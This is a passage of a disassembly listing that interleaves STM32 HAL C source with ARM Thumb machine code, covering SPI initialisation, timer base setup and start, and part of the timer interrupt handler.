    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004b26:	687b      	ldr	r3, [r7, #4]
 8004b28:	685b      	ldr	r3, [r3, #4]
 8004b2a:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004b2e:	d009      	beq.n	8004b44 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004b30:	687b      	ldr	r3, [r7, #4]
 8004b32:	2200      	movs	r2, #0
 8004b34:	61da      	str	r2, [r3, #28]
 8004b36:	e005      	b.n	8004b44 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004b38:	687b      	ldr	r3, [r7, #4]
 8004b3a:	2200      	movs	r2, #0
 8004b3c:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004b3e:	687b      	ldr	r3, [r7, #4]
 8004b40:	2200      	movs	r2, #0
 8004b42:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004b44:	687b      	ldr	r3, [r7, #4]
 8004b46:	2200      	movs	r2, #0
 8004b48:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004b4a:	687b      	ldr	r3, [r7, #4]
 8004b4c:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004b50:	b2db      	uxtb	r3, r3
 8004b52:	2b00      	cmp	r3, #0
 8004b54:	d106      	bne.n	8004b64 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004b56:	687b      	ldr	r3, [r7, #4]
 8004b58:	2200      	movs	r2, #0
 8004b5a:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004b5e:	6878      	ldr	r0, [r7, #4]
 8004b60:	f7fc f8cc 	bl	8000cfc <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004b64:	687b      	ldr	r3, [r7, #4]
 8004b66:	2202      	movs	r2, #2
 8004b68:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004b6c:	687b      	ldr	r3, [r7, #4]
 8004b6e:	681b      	ldr	r3, [r3, #0]
 8004b70:	681a      	ldr	r2, [r3, #0]
 8004b72:	687b      	ldr	r3, [r7, #4]
 8004b74:	681b      	ldr	r3, [r3, #0]
 8004b76:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004b7a:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004b7c:	687b      	ldr	r3, [r7, #4]
 8004b7e:	68db      	ldr	r3, [r3, #12]
 8004b80:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004b84:	d902      	bls.n	8004b8c <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004b86:	2300      	movs	r3, #0
 8004b88:	60fb      	str	r3, [r7, #12]
 8004b8a:	e002      	b.n	8004b92 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004b8c:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004b90:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004b92:	687b      	ldr	r3, [r7, #4]
 8004b94:	68db      	ldr	r3, [r3, #12]
 8004b96:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004b9a:	d007      	beq.n	8004bac <HAL_SPI_Init+0xa0>
 8004b9c:	687b      	ldr	r3, [r7, #4]
 8004b9e:	68db      	ldr	r3, [r3, #12]
 8004ba0:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004ba4:	d002      	beq.n	8004bac <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004ba6:	687b      	ldr	r3, [r7, #4]
 8004ba8:	2200      	movs	r2, #0
 8004baa:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004bac:	687b      	ldr	r3, [r7, #4]
 8004bae:	685b      	ldr	r3, [r3, #4]
 8004bb0:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004bb4:	687b      	ldr	r3, [r7, #4]
 8004bb6:	689b      	ldr	r3, [r3, #8]
 8004bb8:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004bbc:	431a      	orrs	r2, r3
 8004bbe:	687b      	ldr	r3, [r7, #4]
 8004bc0:	691b      	ldr	r3, [r3, #16]
 8004bc2:	f003 0302 	and.w	r3, r3, #2
 8004bc6:	431a      	orrs	r2, r3
 8004bc8:	687b      	ldr	r3, [r7, #4]
 8004bca:	695b      	ldr	r3, [r3, #20]
 8004bcc:	f003 0301 	and.w	r3, r3, #1
 8004bd0:	431a      	orrs	r2, r3
 8004bd2:	687b      	ldr	r3, [r7, #4]
 8004bd4:	699b      	ldr	r3, [r3, #24]
 8004bd6:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004bda:	431a      	orrs	r2, r3
 8004bdc:	687b      	ldr	r3, [r7, #4]
 8004bde:	69db      	ldr	r3, [r3, #28]
 8004be0:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004be4:	431a      	orrs	r2, r3
 8004be6:	687b      	ldr	r3, [r7, #4]
 8004be8:	6a1b      	ldr	r3, [r3, #32]
 8004bea:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004bee:	ea42 0103 	orr.w	r1, r2, r3
 8004bf2:	687b      	ldr	r3, [r7, #4]
 8004bf4:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004bf6:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004bfa:	687b      	ldr	r3, [r7, #4]
 8004bfc:	681b      	ldr	r3, [r3, #0]
 8004bfe:	430a      	orrs	r2, r1
 8004c00:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004c02:	687b      	ldr	r3, [r7, #4]
 8004c04:	699b      	ldr	r3, [r3, #24]
 8004c06:	0c1b      	lsrs	r3, r3, #16
 8004c08:	f003 0204 	and.w	r2, r3, #4
 8004c0c:	687b      	ldr	r3, [r7, #4]
 8004c0e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004c10:	f003 0310 	and.w	r3, r3, #16
 8004c14:	431a      	orrs	r2, r3
 8004c16:	687b      	ldr	r3, [r7, #4]
 8004c18:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004c1a:	f003 0308 	and.w	r3, r3, #8
 8004c1e:	431a      	orrs	r2, r3
 8004c20:	687b      	ldr	r3, [r7, #4]
 8004c22:	68db      	ldr	r3, [r3, #12]
 8004c24:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004c28:	ea42 0103 	orr.w	r1, r2, r3
 8004c2c:	68fb      	ldr	r3, [r7, #12]
 8004c2e:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004c32:	687b      	ldr	r3, [r7, #4]
 8004c34:	681b      	ldr	r3, [r3, #0]
 8004c36:	430a      	orrs	r2, r1
 8004c38:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004c3a:	687b      	ldr	r3, [r7, #4]
 8004c3c:	2200      	movs	r2, #0
 8004c3e:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004c40:	687b      	ldr	r3, [r7, #4]
 8004c42:	2201      	movs	r2, #1
 8004c44:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004c48:	2300      	movs	r3, #0
}
 8004c4a:	4618      	mov	r0, r3
 8004c4c:	3710      	adds	r7, #16
 8004c4e:	46bd      	mov	sp, r7
 8004c50:	bd80      	pop	{r7, pc}

08004c52 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004c52:	b580      	push	{r7, lr}
 8004c54:	b082      	sub	sp, #8
 8004c56:	af00      	add	r7, sp, #0
 8004c58:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004c5a:	687b      	ldr	r3, [r7, #4]
 8004c5c:	2b00      	cmp	r3, #0
 8004c5e:	d101      	bne.n	8004c64 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004c60:	2301      	movs	r3, #1
 8004c62:	e049      	b.n	8004cf8 <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004c64:	687b      	ldr	r3, [r7, #4]
 8004c66:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004c6a:	b2db      	uxtb	r3, r3
 8004c6c:	2b00      	cmp	r3, #0
 8004c6e:	d106      	bne.n	8004c7e <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004c70:	687b      	ldr	r3, [r7, #4]
 8004c72:	2200      	movs	r2, #0
 8004c74:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004c78:	6878      	ldr	r0, [r7, #4]
 8004c7a:	f7fc f943 	bl	8000f04 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004c7e:	687b      	ldr	r3, [r7, #4]
 8004c80:	2202      	movs	r2, #2
 8004c82:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004c86:	687b      	ldr	r3, [r7, #4]
 8004c88:	681a      	ldr	r2, [r3, #0]
 8004c8a:	687b      	ldr	r3, [r7, #4]
 8004c8c:	3304      	adds	r3, #4
 8004c8e:	4619      	mov	r1, r3
 8004c90:	4610      	mov	r0, r2
 8004c92:	f000 fa7d 	bl	8005190 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004c96:	687b      	ldr	r3, [r7, #4]
 8004c98:	2201      	movs	r2, #1
 8004c9a:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004c9e:	687b      	ldr	r3, [r7, #4]
 8004ca0:	2201      	movs	r2, #1
 8004ca2:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004ca6:	687b      	ldr	r3, [r7, #4]
 8004ca8:	2201      	movs	r2, #1
 8004caa:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004cae:	687b      	ldr	r3, [r7, #4]
 8004cb0:	2201      	movs	r2, #1
 8004cb2:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004cb6:	687b      	ldr	r3, [r7, #4]
 8004cb8:	2201      	movs	r2, #1
 8004cba:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004cbe:	687b      	ldr	r3, [r7, #4]
 8004cc0:	2201      	movs	r2, #1
 8004cc2:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004cc6:	687b      	ldr	r3, [r7, #4]
 8004cc8:	2201      	movs	r2, #1
 8004cca:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004cce:	687b      	ldr	r3, [r7, #4]
 8004cd0:	2201      	movs	r2, #1
 8004cd2:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004cd6:	687b      	ldr	r3, [r7, #4]
 8004cd8:	2201      	movs	r2, #1
 8004cda:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004cde:	687b      	ldr	r3, [r7, #4]
 8004ce0:	2201      	movs	r2, #1
 8004ce2:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004ce6:	687b      	ldr	r3, [r7, #4]
 8004ce8:	2201      	movs	r2, #1
 8004cea:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004cee:	687b      	ldr	r3, [r7, #4]
 8004cf0:	2201      	movs	r2, #1
 8004cf2:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004cf6:	2300      	movs	r3, #0
}
 8004cf8:	4618      	mov	r0, r3
 8004cfa:	3708      	adds	r7, #8
 8004cfc:	46bd      	mov	sp, r7
 8004cfe:	bd80      	pop	{r7, pc}

08004d00 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004d00:	b480      	push	{r7}
 8004d02:	b085      	sub	sp, #20
 8004d04:	af00      	add	r7, sp, #0
 8004d06:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004d08:	687b      	ldr	r3, [r7, #4]
 8004d0a:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004d0e:	b2db      	uxtb	r3, r3
 8004d10:	2b01      	cmp	r3, #1
 8004d12:	d001      	beq.n	8004d18 <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004d14:	2301      	movs	r3, #1
 8004d16:	e03b      	b.n	8004d90 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004d18:	687b      	ldr	r3, [r7, #4]
 8004d1a:	2202      	movs	r2, #2
 8004d1c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004d20:	687b      	ldr	r3, [r7, #4]
 8004d22:	681b      	ldr	r3, [r3, #0]
 8004d24:	68da      	ldr	r2, [r3, #12]
 8004d26:	687b      	ldr	r3, [r7, #4]
 8004d28:	681b      	ldr	r3, [r3, #0]
 8004d2a:	f042 0201 	orr.w	r2, r2, #1
 8004d2e:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004d30:	687b      	ldr	r3, [r7, #4]
 8004d32:	681b      	ldr	r3, [r3, #0]
 8004d34:	4a19      	ldr	r2, [pc, #100]	; (8004d9c <HAL_TIM_Base_Start_IT+0x9c>)
 8004d36:	4293      	cmp	r3, r2
 8004d38:	d009      	beq.n	8004d4e <HAL_TIM_Base_Start_IT+0x4e>
 8004d3a:	687b      	ldr	r3, [r7, #4]
 8004d3c:	681b      	ldr	r3, [r3, #0]
 8004d3e:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004d42:	d004      	beq.n	8004d4e <HAL_TIM_Base_Start_IT+0x4e>
 8004d44:	687b      	ldr	r3, [r7, #4]
 8004d46:	681b      	ldr	r3, [r3, #0]
 8004d48:	4a15      	ldr	r2, [pc, #84]	; (8004da0 <HAL_TIM_Base_Start_IT+0xa0>)
 8004d4a:	4293      	cmp	r3, r2
 8004d4c:	d115      	bne.n	8004d7a <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004d4e:	687b      	ldr	r3, [r7, #4]
 8004d50:	681b      	ldr	r3, [r3, #0]
 8004d52:	689a      	ldr	r2, [r3, #8]
 8004d54:	4b13      	ldr	r3, [pc, #76]	; (8004da4 <HAL_TIM_Base_Start_IT+0xa4>)
 8004d56:	4013      	ands	r3, r2
 8004d58:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d5a:	68fb      	ldr	r3, [r7, #12]
 8004d5c:	2b06      	cmp	r3, #6
 8004d5e:	d015      	beq.n	8004d8c <HAL_TIM_Base_Start_IT+0x8c>
 8004d60:	68fb      	ldr	r3, [r7, #12]
 8004d62:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004d66:	d011      	beq.n	8004d8c <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004d68:	687b      	ldr	r3, [r7, #4]
 8004d6a:	681b      	ldr	r3, [r3, #0]
 8004d6c:	681a      	ldr	r2, [r3, #0]
 8004d6e:	687b      	ldr	r3, [r7, #4]
 8004d70:	681b      	ldr	r3, [r3, #0]
 8004d72:	f042 0201 	orr.w	r2, r2, #1
 8004d76:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d78:	e008      	b.n	8004d8c <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004d7a:	687b      	ldr	r3, [r7, #4]
 8004d7c:	681b      	ldr	r3, [r3, #0]
 8004d7e:	681a      	ldr	r2, [r3, #0]
 8004d80:	687b      	ldr	r3, [r7, #4]
 8004d82:	681b      	ldr	r3, [r3, #0]
 8004d84:	f042 0201 	orr.w	r2, r2, #1
 8004d88:	601a      	str	r2, [r3, #0]
 8004d8a:	e000      	b.n	8004d8e <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d8c:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004d8e:	2300      	movs	r3, #0
}
 8004d90:	4618      	mov	r0, r3
 8004d92:	3714      	adds	r7, #20
 8004d94:	46bd      	mov	sp, r7
 8004d96:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004d9a:	4770      	bx	lr
 8004d9c:	40012c00 	.word	0x40012c00
 8004da0:	40014000 	.word	0x40014000
 8004da4:	00010007 	.word	0x00010007

08004da8 <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004da8:	b580      	push	{r7, lr}
 8004daa:	b084      	sub	sp, #16
 8004dac:	af00      	add	r7, sp, #0
 8004dae:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004db0:	687b      	ldr	r3, [r7, #4]
 8004db2:	681b      	ldr	r3, [r3, #0]
 8004db4:	68db      	ldr	r3, [r3, #12]
 8004db6:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004db8:	687b      	ldr	r3, [r7, #4]
 8004dba:	681b      	ldr	r3, [r3, #0]
 8004dbc:	691b      	ldr	r3, [r3, #16]
 8004dbe:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004dc0:	68bb      	ldr	r3, [r7, #8]
 8004dc2:	f003 0302 	and.w	r3, r3, #2
 8004dc6:	2b00      	cmp	r3, #0
 8004dc8:	d020      	beq.n	8004e0c <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004dca:	68fb      	ldr	r3, [r7, #12]
 8004dcc:	f003 0302 	and.w	r3, r3, #2
 8004dd0:	2b00      	cmp	r3, #0
 8004dd2:	d01b      	beq.n	8004e0c <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004dd4:	687b      	ldr	r3, [r7, #4]
 8004dd6:	681b      	ldr	r3, [r3, #0]
 8004dd8:	f06f 0202 	mvn.w	r2, #2
 8004ddc:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	2201      	movs	r2, #1
 8004de2:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004de4:	687b      	ldr	r3, [r7, #4]
 8004de6:	681b      	ldr	r3, [r3, #0]
 8004de8:	699b      	ldr	r3, [r3, #24]
 8004dea:	f003 0303 	and.w	r3, r3, #3
 8004dee:	2b00      	cmp	r3, #0
 8004df0:	d003      	beq.n	8004dfa <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004df2:	6878      	ldr	r0, [r7, #4]
 8004df4:	f000 f9ad 	bl	8005152 <HAL_TIM_IC_CaptureCallback>
 8004df8:	e005      	b.n	8004e06 <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004dfa:	6878      	ldr	r0, [r7, #4]
 8004dfc:	f000 f99f 	bl	800513e <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e00:	6878      	ldr	r0, [r7, #4]
 8004e02:	f000 f9b0 	bl	8005166 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e06:	687b      	ldr	r3, [r7, #4]
 8004e08:	2200      	movs	r2, #0
 8004e0a:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004e0c:	68bb      	ldr	r3, [r7, #8]
 8004e0e:	f003 0304 	and.w	r3, r3, #4
 8004e12:	2b00      	cmp	r3, #0
 8004e14:	d020      	beq.n	8004e58 <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004e16:	68fb      	ldr	r3, [r7, #12]
 8004e18:	f003 0304 	and.w	r3, r3, #4
 8004e1c:	2b00      	cmp	r3, #0
 8004e1e:	d01b      	beq.n	8004e58 <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004e20:	687b      	ldr	r3, [r7, #4]
 8004e22:	681b      	ldr	r3, [r3, #0]
 8004e24:	f06f 0204 	mvn.w	r2, #4
 8004e28:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004e2a:	687b      	ldr	r3, [r7, #4]
 8004e2c:	2202      	movs	r2, #2
 8004e2e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004e30:	687b      	ldr	r3, [r7, #4]
 8004e32:	681b      	ldr	r3, [r3, #0]
 8004e34:	699b      	ldr	r3, [r3, #24]
 8004e36:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e3a:	2b00      	cmp	r3, #0
 8004e3c:	d003      	beq.n	8004e46 <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e3e:	6878      	ldr	r0, [r7, #4]
 8004e40:	f000 f987 	bl	8005152 <HAL_TIM_IC_CaptureCallback>
 8004e44:	e005      	b.n	8004e52 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e46:	6878      	ldr	r0, [r7, #4]
 8004e48:	f000 f979 	bl	800513e <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e4c:	6878      	ldr	r0, [r7, #4]
 8004e4e:	f000 f98a 	bl	8005166 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e52:	687b      	ldr	r3, [r7, #4]
 8004e54:	2200      	movs	r2, #0
 8004e56:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004e58:	68bb      	ldr	r3, [r7, #8]
 8004e5a:	f003 0308 	and.w	r3, r3, #8
 8004e5e:	2b00      	cmp	r3, #0
 8004e60:	d020      	beq.n	8004ea4 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004e62:	68fb      	ldr	r3, [r7, #12]
 8004e64:	f003 0308 	and.w	r3, r3, #8
 8004e68:	2b00      	cmp	r3, #0
 8004e6a:	d01b      	beq.n	8004ea4 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004e6c:	687b      	ldr	r3, [r7, #4]
 8004e6e:	681b      	ldr	r3, [r3, #0]
 8004e70:	f06f 0208 	mvn.w	r2, #8
 8004e74:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004e76:	687b      	ldr	r3, [r7, #4]
 8004e78:	2204      	movs	r2, #4
 8004e7a:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004e7c:	687b      	ldr	r3, [r7, #4]
 8004e7e:	681b      	ldr	r3, [r3, #0]
 8004e80:	69db      	ldr	r3, [r3, #28]
 8004e82:	f003 0303 	and.w	r3, r3, #3
 8004e86:	2b00      	cmp	r3, #0
 8004e88:	d003      	beq.n	8004e92 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e8a:	6878      	ldr	r0, [r7, #4]
 8004e8c:	f000 f961 	bl	8005152 <HAL_TIM_IC_CaptureCallback>
 8004e90:	e005      	b.n	8004e9e <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e92:	6878      	ldr	r0, [r7, #4]
 8004e94:	f000 f953 	bl	800513e <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
